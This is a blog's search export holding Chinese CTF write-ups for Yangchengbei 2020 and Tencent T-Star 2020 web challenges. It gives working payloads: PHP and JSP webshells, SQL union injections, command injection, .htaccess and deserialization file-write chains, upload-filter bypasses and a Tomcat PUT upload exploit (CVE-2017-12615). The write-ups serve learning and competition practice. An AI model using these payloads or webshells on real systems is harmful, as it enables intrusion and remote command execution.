<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>羊城杯 2020</title>
    <url>/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<p>记录一下wp<a id="more"></a></p>
<h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>连接上蚁剑后，发现<code>bbbbbbbbb.txt</code>文件，base64解码保存为图片即可看到flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">r&#x27;bbbbbbbbb.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f2 = open(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">flag = (base64.b64decode(s))</span><br><span class="line">f2.write(flag)</span><br><span class="line">f2.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h1 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h1><p>源码在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">view-source:http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/Hei_Mao_Jing_Chang.mp3</span><br></pre></td></tr></table></figure>

<p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>原题在：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://neversecure.ca/category/bug-hunting/</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/</span><br><span class="line"><span class="comment">#post提交</span></span><br><span class="line">Black-Cat-Sheriff=<span class="number">04</span>b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat+flag.php&amp;White-cat-monitor=%<span class="number">5</span>B%<span class="number">5</span>D</span><br></pre></td></tr></table></figure>

<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在网上可以找到原题：<code>X-NUCA&#39;2019—Ezphp</code></p>
<p>前提知识：</p>
<p><code>php.ini</code>中有两项：</p>
<p>在所有页面的顶部与底部require文件</p>
<ul>
<li><p><code>auto_prepend_file</code> 在页面顶部加载文件</p>
</li>
<li><p><code>auto_append_file</code> 在页面底部加载文件</p>
</li>
</ul>
<p>例如：</p>
<p>将<code>.htaccess</code>这个文件包含进所有的php页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br></pre></td></tr></table></figure>

<p>然后对于<code>stristr()</code>的黑名单过滤直接用反斜杠即可绕过</p>
<p>对于后面拼接进来的<code>&quot;\nHello World&quot;</code>需要用反斜杠转义</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#x27;cat /f&#x27;.&#x27;lag&#x27;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><p>首先访问<code>robots.txt</code>，提示<code>Disallow: /star1.php/</code>，源代码里有:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!--  小胖说用个不安全的协议从我家才能进ser.php呢！  !--&gt;</span><br></pre></td></tr></table></figure>

<p>不安全协议用<code>http</code>访问：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php</span><br></pre></td></tr></table></figure>

<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>很明显<code>file_put_contents</code>是要写shell进去，并且在内容前加了死亡函数，遂构造链条，这里触发<code>__toString</code>，但是没有地方可以触发，盲猜应该是<code>echo unserialize</code>的反序列入口。构造链如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$GWHT = new GWHT();</span><br><span class="line">$GWHT-&gt;hero = new Yongen();</span><br><span class="line">$GWHT-&gt;hero-&gt;file = &#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;;</span><br><span class="line">$GWHT-&gt;hero-&gt;text = &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;;</span><br><span class="line">$a = serialize($GWHT);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php&amp;c=O:4:&quot;GWHT&quot;:1:&#123;s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:&#123;s:4:&quot;file&quot;;s:77:&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>蚁剑连上在根目录<code>/ffflag</code>即可获得flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10024</span>/sandbox/hrnh1cvpq4bvbm960878icaodb/shell.php</span><br><span class="line">cmd</span><br></pre></td></tr></table></figure>

<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>首先用伪协议读取文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</span><br><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure>

<p>源码为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        die(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    <span class="keyword">if</span> (isset($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        	die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        echo <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>首先可以用单引号嵌套反引号执行命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=GWHT.php&amp;count=&#x27;`ls &gt; 1.txt`&#x27;</span><br></pre></td></tr></table></figure>

<p>前提知识：</p>
<p>因为过滤了<code>$_POST</code>和<code>$_GET</code>，需要可以用到<code>get_defined_vars()</code>。</p>
<p>打印一个<code>get_defined_vars()</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">array(4) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(1) &#123; [&quot;pass&quot;]=&gt; string(4) &quot;PASS&quot; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>可以看到最外层是一个<code>array</code>，<code>array</code>的第一个值是<code>_GET</code>，如果我们在函数外层嵌套两层pos就可以获取到<code>_GET</code>的值了，下面就相当于一个一句话木马了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(pos(pos(get_defined_vars())));</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(pos(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

<p>然后再写一个<code>post</code>的🐎</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/1.php?a=file_put_contents(&#x27;kkk.php&#x27;, base64_decode(&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;));</span><br></pre></td></tr></table></figure>

<p>又或者用<code>next</code>可以直接连接蚁剑</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(next(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>腾讯T-Star高校挑战赛 2020</title>
    <url>/2020/07/02/2020%E8%85%BE%E8%AE%AF%E7%8A%80%E7%89%9B%E9%B8%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<p>Gq和hhhm师傅tql<a id="more"></a></p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>考点：前端js验证图片后缀</p>
<p>上传jpg图片后改php后缀forword，内容是一句话木马</p>
<p>在key目录下有key{K735c9f0D7ddc3b9}</p>
<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>输入框输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3,database()--</span></span><br><span class="line"><span class="string">0&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;web1&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3,column_name from information_schema.columns where table_name=&#x27;</span>fl4g<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">0&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,flag <span class="keyword">from</span> fl4g<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baidu.com | cat  ..&#x2F;key.php</span><br></pre></td></tr></table></figure>

<h2 id="你能爆破吗"><a href="#你能爆破吗" class="headerlink" title="你能爆破吗"></a>你能爆破吗</h2><ul>
<li><p>burpsuite爆破密码账号都是admin，登陆成功会set一个cookie，cookie是用户名的base64。</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-admin<span class="string">&quot;union select 1,(select group_concat(flag) from flag),3-- </span></span><br></pre></td></tr></table></figure>

<ul>
<li>base64</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LWFkbWluInVuaW9uIHNlbGVjdCAxLChzZWxlY3QgZ3JvdXBfY29uY2F0KGZsYWcpIGZyb20gZmxhZyksMy0tIA==</span><br></pre></td></tr></table></figure>

<h2 id="文件包含GetShell"><a href="#文件包含GetShell" class="headerlink" title="文件包含GetShell"></a>文件包含GetShell</h2><p>首先在<code>lfi.txt</code>读到源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($file != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $inc = sprintf(<span class="string">&quot;%s.php&quot;</span>, $file); // only php file can be included</span><br><span class="line">    include($inc);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>直接用伪协议</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
<li><p>对&lt;?、php、eval等进行了过滤，过滤比较简单直接替换为空，直接双写就能绕过，eval直接利用php对大小写不敏感绕过。</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;php?&lt;?p&lt;?phphp EVAL($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后改.pht的后缀能上传，限制了20kb-100kb的文件大小，和图片混在一起上传即可，连上蚁剑之后在key下发现flag{Aa3c7c37508E40B3}</p>
<h2 id="小猫咪踩灯泡"><a href="#小猫咪踩灯泡" class="headerlink" title="小猫咪踩灯泡"></a>小猫咪踩灯泡</h2><p>题目给hint</p>
<ul>
<li>CVE-2017-12615</li>
</ul>
<p>抓包把GET改为PUT，后面添加jsp加斜杠上传马</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PUT /kawhi.jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">012</span>c8bc2.yunyansec.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">77.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">77.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">If-Modified-Since: Thu, <span class="number">20</span> Jun <span class="number">2019</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">08</span> GMT</span><br><span class="line">If-<span class="literal">None</span>-Match: W/<span class="string">&quot;5619-1561024988000&quot;</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Length: <span class="number">666</span></span><br><span class="line"></span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();<span class="keyword">try</span> &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;<span class="keyword">while</span> ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line">+<span class="string">&quot;\\n&quot;</span>);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;<span class="keyword">return</span> line.toString();&#125;%&gt;&lt;%<span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="string">&quot;&quot;</span>.equals(request.getParameter(<span class="string">&quot;cmd&quot;</span>)))&#123;out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="string">&quot;cmd&quot;</span>))+<span class="string">&quot;&lt;/pre&gt;&quot;</span>);&#125;<span class="keyword">else</span>&#123;out.println(<span class="string">&quot;:-)&quot;</span>);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p>查看根目录</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://012c8bc2.yunyansec.com/kawhi.jsp?&amp;pwd=023&amp;cmd=ls</span><br></pre></td></tr></table></figure>

<p>发现flag文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://012c8bc2.yunyansec.com/kawhi.jsp?&amp;pwd=023&amp;cmd=cat%20flag.txt</span><br></pre></td></tr></table></figure>

<h2 id="分析代码获得flag"><a href="#分析代码获得flag" class="headerlink" title="分析代码获得flag"></a>分析代码获得flag</h2><p>题目直接给源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">7</span>)&#123;</span><br><span class="line">     echo shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>基础知识</strong></p>
<p>详情参考：<a style="text-decoration:none;" class="foo" href="https://xz.aliyun.com/t/2748" target="_blank">传送门</a> 和 <a style="text-decoration:none;" class="foo" href="https://blog.csdn.net/nzjdsds/article/details/102873187" target="_blank">传送门</a></p>
<p>这里的话是限制了7个字符</p>
<p>payload用的是仕廷大佬wp里的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;l\\</span><br><span class="line">&gt;s\ \\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br><span class="line">ls&gt;&gt;_</span><br></pre></td></tr></table></figure>

<p>这里的意思我觉得是先构造<code>_</code>，然后利用<code>_</code>去构造出<code>ls -t&gt;y</code>，然后再利用<code>ls -t&gt;y</code>去构造我们的webshell。</p>
<p>webshell</p>
